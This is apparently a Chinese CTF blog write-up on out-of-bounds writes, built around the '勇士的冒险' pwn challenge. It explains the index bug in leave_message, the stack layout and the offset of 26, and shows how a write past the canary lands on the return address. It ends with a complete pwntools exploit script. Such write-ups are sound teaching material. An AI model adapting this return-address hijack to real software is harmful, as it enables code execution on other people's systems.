+++
date = '2026-10-23T16:49:47+08:00'
draft = false
title = 'OOB越界读写'
tags = ["pwn","OOB","Canary 绕过"]
categories = ["CTF"]
description = "Leave Message — OOB Read/Write 劫持返回地址"
+++

## 什么是 OOB（Out-of-Bounds / 越界）

OOB 是 **Out-of-Bounds** 的缩写，中文叫**越界**。指的是程序访问了**缓冲区（数组/内存区域）范围之外**的内存。分两种：

| 类型 | 英文 | 含义 |
| --- | --- | --- |
| OOB Read | 越界读 | 去读缓冲区**范围之外**的内存 |
| OOB Write | 越界写 | 往缓冲区**范围之外**的内存写数据 |

### 与"栈溢出"的区别

|  | 栈溢出 Stack Overflow | 越界写 OOB Write |
| --- | --- | --- |
| 触发方式 | 输入**超长**内容，把缓冲区填满后继续往后覆盖 | 用**下标/索引**算出地址，直接跳到缓冲区外面去写 |
| 关键因素 | 长度不够 → 漫出去 | 位置不对 → 跳出去 |
| 是否需要很长输入 | 需要 | 不需要，一个特殊下标就够 |

### 理解 OOB

```c
int arr[10];        // 合法范围：arr[0] ~ arr[9]
arr[15] = 666;      // 越界写！15 超过数组边界，写到了 arr 后面的内存
arr[-3] = 666;      // 越界写！负数下标，写到 arr 前面的内存
```

**C 语言的数组没有边界检查**——下标给多少，就访问那个位置，不校验合不合法。这是 C 的历史设计（性能优先），但也给了攻击者机会：**用精心构造的下标，把数据写到任意想写的内存位置**。

## 例题 （取自0xGame2026——勇士的冒险）

### 一、题目环境与保护机制

用 `checksec` 查看保护：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found       ← 开启了栈金丝雀
NX:         NX enabled         ← 栈不可执行
PIE:        No PIE             ← 未开启，地址固定！关键
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

**关键结论：**

- **未开 PIE** → 函数地址固定，win 后门地址 `0x402264` 可直接写死
- **开启 Canary** → 栈上有一道"金丝雀"校验，正常栈溢出会踩坏它被检测。但我们用 OOB **精准跳过**它

### 二、程序功能

主菜单（main）有多个功能选项，其中选 **6** 进入 `leave_message()`，漏洞就在这个函数里。

其实可以注意到，题目给后门了：![图2](/images/OOB/图2.png)

如何利用呢？

***

### 三、漏洞点分析

#### 主要函数信息

先看main：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  welcome();
  entry();
  init_game();
  puts(&s_);
  puts("========================================");
  puts("       WELCOME, BRAVE HERO");
  puts("========================================");
  puts(&s_);
  puts("Five trials await you.");
  puts("Defeat every monster to reach the end.");
  puts(&s_);
  while ( 1 )
  {
    menu();
    printf("Choice: ");
    switch ( (unsigned int)read_int() )
    {
      case 1u:
        check_status();
        break;
      case 2u:
        buy_item();
        break;
      case 3u:
        sell_item();
        break;
      case 4u:
        show_inventory();
        break;
      case 5u:
        challenge();
        break;
      case 6u:
        leave_message();
        break;
      case 7u:
        puts("Goodbye.");
        exit(0);
      default:
        puts("Invalid choice.");
        break;
    }
  }
}
```

其实正常前⾯⼏个功能都很正常。可是玩游戏为什么会出现留⾔的功能？这很突兀吧。 所以漏洞就在这⾥的留⾔功能

现在进`leave_message`看看：

```c
unsigned __int64 leave_message()
{
  int v1; // [rsp+4h] [rbp-6Ch] BYREF
  int n2; // [rsp+8h] [rbp-68h] BYREF
  unsigned int v3; // [rsp+Ch] [rbp-64h]
  _BYTE s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x50uLL);
  while ( 1 )
  {
    puts("Enter chat index : ");
    __isoc99_scanf(&word_403008, &v1);
    if ( v1 < 0 )
      break;
    v3 = 4 * v1;
    puts("Chat Menu:");
    puts("1. Read word  2. Write word");
    puts("Choice: ");
    __isoc99_scanf(&word_403008, &n2);
    if ( n2 == 1 )
    {
      read_word(s, v3);
    }
    else if ( n2 == 2 )
    {
      write_word(s, v3);
    }
    else
    {
      puts("Invalid choice.");
    }
  }
  puts("Crazy!");
  return v5 - __readfsqword(0x28u);
}
```

进入write_word看看：

```c
unsigned __int64 __fastcall write_word(__int64 a1, int a2)
{
  int n2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Enter value: ");
  __isoc99_scanf(&word_403008, &n2);
  *(_DWORD *)(a2 + a1) = n2;
  puts("Value written!");
  return v4 - __readfsqword(0x28u);
}
```

- `base` = `s`（数组首地址）
- `offset` = `v3`（用户可控的偏移）
- 代个参数就能发现，写入位置 = `s + v3`

#### 漏洞成因（3 个条件叠加）

1. `scanf("%d", &v1)` 读的是**有符号 int**，v1 可以输入任意大数字
2. `v3 = 4 * v1` **没有任何边界检查**，v3 可以远超 88
3. `*(DWORD *)(s + v3) = n2` 直接按计算出的地址写入，**越界写**

***

### 四、栈布局图解

64 位下，以 `rbp` 为基准，从**低地址**到**高地址**排列：

```text
内存地址        内容               栈帧内位置
──────────────────────────────────────────────────
低地址 ↑
┌──────────────────────────────┐
│  v1  (输入索引)               │  rbp-0x6C
├──────────────────────────────┤
│  n2  (读/写选择)               │  rbp-0x68
├──────────────────────────────┤
│  v3  (偏移 = 4*v1)            │  rbp-0x64
├──────────────────────────────┤
│  s[0]                        │  rbp-0x60  ← 数组 s 起始
│  ... (BYTE s[88]，88字节)     │
│  s[87]                       │  rbp-0x08 前
├──────────────────────────────┤
│  Canary (v5)                 │  rbp-0x8   ← 金丝雀
├──────────────────────────────┤
│  保存的旧 rbp                    rbp
├──────────────────────────────┤
│  返回地址 ret  ★★★             rbp+0x8   ← 我们要改这里！
├──────────────────────────────┤
│  调用者栈帧                      rbp+0x10
└──────────────────────────────┘
高地址 ↓
```

***

### 五、偏移计算（为什么是 26）

目标：把 `s + v3` 对准 **返回地址 ret**。

```text
s 起始位置：rbp - 0x60
ret 位置：  rbp + 0x8

需要偏移 = (rbp + 0x8) - (rbp - 0x60)
         = 0x8 - (-0x60)
         = 0x68
         = 104 字节
```

而程序固定写 `v3 = 4 * v1`，所以要：

```text
4 * v1 = 104
v1 = 104 / 4 = 26   
```

***

### 六、利用思路（分两步走）

**第一步：写入返回地址**

- 输入 `v1=26`（正数，不触发 break）→ v3=104
- 选 Write → 把 **win 地址 `0x402264`** 写进返回地址 ret

**第二步：触发 ret 执行**

- 再输入**任意负数**（如 -1）→ 触发 `v1<0` → break 跳出 while 死循环
- 函数执行到末尾 → `ret` 指令弹出栈顶 → 跳转到 win → getshell

> **为什么写完还要输入负数？**
因为 `v1<0` 直接 break 跳出**死循环**，让函数走到 ret。
如果一直输入正数，函数永远在循环里，ret 永远不会执行，篡改无效。
负数只起“放行”作用，经过试验，-1 / -10 / -100 效果一样。

***

### 七、完整 EXP

```python
from pwn import *
#context.log_level = 'debug'

io = remote('nc1.ctfplus.cn',19356)
#io = process('./pwn')
io.recvuntil(b'play!')
io.send(p32(1)+b'\x01')
io.recvuntil(b'Choice: ')
io.sendline(b'6')
win = 0x402264
def place(idx):
    io.sendlineafter(b'index : \n',str(idx))
def ch(idx):
    io.sendlineafter(b': \n',str(idx))
def write(idx,value):
  place(idx)
  ch(2)
  io.sendlineafter(b'value: ',str(value))
write(26,win)
place(-1)
io.interactive()

```

![图1](/images/OOB/图1.png)

### 八、关键点总结

| 步骤 | 输入 | 作用 |
| --- | --- | --- |
| 进入函数 | 6 | 进入 leave_message |
| 越界写 ret | 26 → 选 2 → 0x402264 | 把返回地址改成 win |
| 放行触发 | -1 | break 跳出死循环，让函数执行到 ret |

**核心思路一句话**：用负数下标/大下标算出越界地址，把返回地址 ret 改成后门函数地址，再用负数放行让函数 return，劫持 rip 拿到 shell。

### 九、为什么能绕过 Canary

- 栈上有金丝雀 Canary（在 `rbp-0x8`）
- 普通栈溢出必须从缓冲区**一路覆盖到 ret**，必然会踩坏 Canary → 触发检测崩溃
- 而这道题的 OOB **精准定位**：直接从 `s+104` 写到 ret（rbp+8），**完全没碰 Canary**
- 所以函数返回前校验 Canary 时，值还是原来的，校验通过 

> 这是这道题最妙的地方：**用精准越界写，跳过了金丝雀保护**。
